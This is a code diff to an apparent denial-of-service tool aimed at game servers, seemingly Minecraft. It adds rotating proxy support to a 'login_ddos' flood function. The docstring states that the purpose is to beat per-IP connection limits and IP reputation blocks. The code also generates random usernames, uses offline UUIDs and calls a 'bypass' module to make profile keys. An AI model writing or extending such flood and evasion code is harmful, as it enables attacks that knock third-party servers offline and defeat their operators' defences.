@@ -90,23 +90,46 @@ async def tcp_ddos(host, port, iterations=None, workers=20,
 
 async def login_ddos(host, port, version, workers=20,
                      stop=None, stats=None, log=None,
-                     signed=False, share_key=True):
-    """Repeated full logins. Expensive: runs full login handshake each time."""
+                     signed=False, share_key=True, proxies=None):
+    """Repeated full logins. Expensive: runs full login handshake each time.
+
+    proxies: optional list of proxy dicts; each worker picks a random one
+    (rotates on failure) so different egress IPs are used — needed to beat
+    per-IP connection limits and DC-IP reputation blocks."""
     stats = stats or Stats()
     stop = stop or (lambda: False)
     log = log or (lambda *a: None)
+    plist = list(proxies or [])
+
+    class _Pool:
+        def __init__(self, items):
+            self.items = items; self.idx = 0; self.dead = set()
+        def take(self):
+            if not self.items: return None
+            for _ in range(len(self.items)):
+                it = self.items[self.idx % len(self.items)]; self.idx += 1
+                if id(it) not in self.dead: return it
+            return None
+        def mark(self, it):
+            self.dead.add(id(it))
+    pool = _Pool(plist)
 
     async def worker():
         while not stop():
             nm = f"L{random.randint(1, 99999)}"
             pk = bypass.make_profile_key(nm, share=share_key) if signed else None
+            px = pool.take()
             c = MCConn(host, port, username=nm, log=lambda *a: None,
-                       profile_key=pk)
+                       profile_key=pk, proxy=px,
+                       offline_uuid=True)
             try:
                 ok = await c.login(version, wait_play=False)
                 stats.add(ok, 3000 if ok else 500)
+                if ok:
+                    log(f"  PLAY via {px['host']}:{px['port']}" if px else "  PLAY (direct)")
             except Exception:
                 stats.add(False, 500)
+                if px: pool.mark(px)
             finally:
                 await c.close()
             await asyncio.sleep(random.uniform(0.05, 0.4))
